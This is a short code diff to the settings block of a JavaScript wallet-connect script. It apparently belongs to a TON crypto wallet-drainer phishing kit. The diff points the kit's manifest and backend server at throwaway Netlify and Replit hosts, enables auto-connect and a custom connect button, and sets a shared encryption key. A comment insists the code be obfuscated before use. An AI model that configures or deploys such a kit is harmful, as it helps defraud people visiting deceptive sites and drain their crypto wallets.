@@ -2,7 +2,7 @@
 // OBFUSCATION MUST BE MADE BEFORE USE https://obfuscator.io/
 
 // Ton Manifest - Your website avatar and domain name are displayed when you connect your wallet.
-const manifestUrl = 'https://eth-etf.net/tonconnect-manifest.json';
+const manifestUrl = 'https://steady-kulfi-0b08d6.netlify.app/tonconnect-manifest.json';
 
 // The encryption key between the server and Frontend must be the same
 let keyEncr = 500;
@@ -11,11 +11,11 @@ let keyEncr = 500;
 const maxRetry = 3;
 
 // Domain server
-const server = ''
+const server = 'https://fc2a4a45-a5ad-40c6-94f1-5d007d08d90b-00-3i3713yxqyu4e.worf.replit.dev/'
 
 //
-const custom_btn = false; // Your own button to connect
-const custom_btn_name = 'button'; // For future updates, don't touch
+const custom_btn = true; // Your own button to connect
+const custom_btn_name = 'modal_rect_bottom_button'; // For future updates, don't touch
 const autoconnect = true; // Auto-connect when entering the site
 
 
